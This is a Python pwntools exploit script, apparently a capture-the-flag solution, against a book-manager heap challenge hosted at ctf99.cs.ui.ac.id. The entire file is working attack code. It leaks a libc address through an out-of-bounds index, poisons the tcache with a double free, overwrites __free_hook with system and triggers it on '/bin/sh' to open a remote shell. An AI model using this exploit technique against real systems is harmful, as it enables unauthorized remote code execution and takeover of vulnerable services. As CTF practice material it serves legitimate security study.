#!/usr/bin/python3 
from pwn import * 

def establish_connection():
    binary_name = "chall"
    elf = context.binary = ELF(binary_name) 
    libc = ELF("libc-2.27.so")
    server_address = "ctf99.cs.ui.ac.id"
    server_port = 10022
    connection = remote(server_address, server_port)
    return connection, elf, libc

def send_command(connection, command):
    connection.sendlineafter(b"> ", command)

def add_book(connection, index, title, page): 
    send_command(connection, b"1")
    connection.sendlineafter(b": ", str(index).encode()) 
    connection.sendlineafter(b": ", title) 
    connection.sendlineafter(b": ", str(page).encode()) 

def read_book(connection, index): 
    send_command(connection, b"2") 
    connection.sendlineafter(b": ", str(index).encode()) 
    return (connection.recvline().split()[-1].strip(), connection.recvline().split()[-1].strip()) 

def remove_book(connection, index): 
    send_command(connection, b"3") 
    connection.sendlineafter(b": ", str(index).encode()) 

def execute_shell(connection, elf, libc):
    leak = eval(read_book(connection, -4)[1]) 
    log.info("Leak: " + hex(leak))
    libc.address = leak - libc.sym._IO_2_1_stdout_ - 131
    log.info("Libc: " + hex(libc.address))

    for i in range(7): 
        add_book(connection, i, b"A" * 0x10, 0x69) 
    add_book(connection, 7, b"A" * 0x10, 0x69) 
    for i in range(7): 
        remove_book(connection, i) 
    remove_book(connection, 7)
    for i in range(7): 
        add_book(connection, i, b"A" * 0x10, 0x69) 
    remove_book(connection, 7)
    add_book(connection, 8, p64(libc.sym.__free_hook - 0x10), 0x69) 
    add_book(connection, 9, b"/bin/sh\0", 0x69) 
    add_book(connection, 10, p64(libc.sym.system), 0x69) 
    remove_book(connection, 9)
    connection.interactive()

if __name__ == "__main__":
    connection, elf, libc = establish_connection()
    execute_shell(connection, elf, libc)
